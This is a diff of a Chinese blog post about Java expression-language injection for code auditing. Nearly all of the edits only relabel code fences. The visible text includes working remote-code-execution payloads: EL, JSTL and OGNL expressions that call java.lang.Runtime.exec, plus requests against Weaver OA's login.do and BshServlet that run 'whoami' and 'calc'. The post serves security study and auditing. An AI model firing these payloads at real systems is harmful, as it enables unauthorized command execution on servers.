@@ -11,6 +11,7 @@ categories:
 - 代码审计
 ---
 
+jsp常用
 <!--more-->
 
 ## 简介
@@ -21,7 +22,7 @@ Java中表达式根据框架分为好多种，其中EL表达式是jsp的内置�
 
 ### 获取变量
 
-```jsp
+```java
 <%@ page import="java.util.HashMap" %>
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
 <%
@@ -69,14 +70,14 @@ Java中表达式根据框架分为好多种，其中EL表达式是jsp的内置�
 
 ### 函数
 
-```jsp
+```java
 ${ns:func(param1, param2, ...)}
 ```
 用el表达式调用函数必须使用`taglib`引入你的标签库
 
 ### 调用Java方法
 
-```jsp
+```java
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
 <%@taglib prefix="elFunc" uri="http://www.test.com/elFunc" %>
 <%
@@ -101,7 +102,7 @@ ${ns:func(param1, param2, ...)}
 单个文件禁用EL表达式
 在JSP文件中可以有如下定义：
 
-```jsp
+```java
 <%@ page isELIgnored="true" %>
 ```
 该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。
@@ -114,7 +115,7 @@ JSP2.0中默认的启用EL表达式。
 
 ### 通用POC
 
-```jsp
+```java
 ${pageContext}
 ${pageContext.getSession().getServletContext().getClassLoader().getResource("")}
 ${header}
@@ -123,7 +124,7 @@ ${pageContext.setAttribute("a","".getClass().forName("java.lang.Runtime").getMet
 ```
 
 ### Struts2 OGNL
-```
+```txt
 @[类全名（包括包路径）]@[方法名 |  值名]，例如：
 @java.lang.String@format('foo %s', 'bar')
 ```
@@ -145,7 +146,7 @@ String result = parser.parseExpression(expression).getValue().toString();
 
 ### JSP JSTL_EL
 
-```jsp
+```java
 <spring:message text="${/"/".getClass().forName(/"java.lang.Runtime/").getMethod(/"getRuntime/",null).invoke(null,null).exec(/"calc/",null).toString()}">
 </spring:message>
 ```
@@ -159,18 +160,18 @@ Boolean result = (Boolean) MVEL.eval(expression, vars);
 
 ### 泛微OA EL表达式注入
 
-```jsp
+```java
 login.do?message=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())
 ```
 或者POST
 
-```jsp
+```java
 message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami
 ```
 
 还有一种
 
-```jsp
+```http
 POST /weaver/bsh.servlet.BshServlet
 bsh.script=eval%00("ex"%2b"ec(\\"cmd+/c+calc\\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
 ```
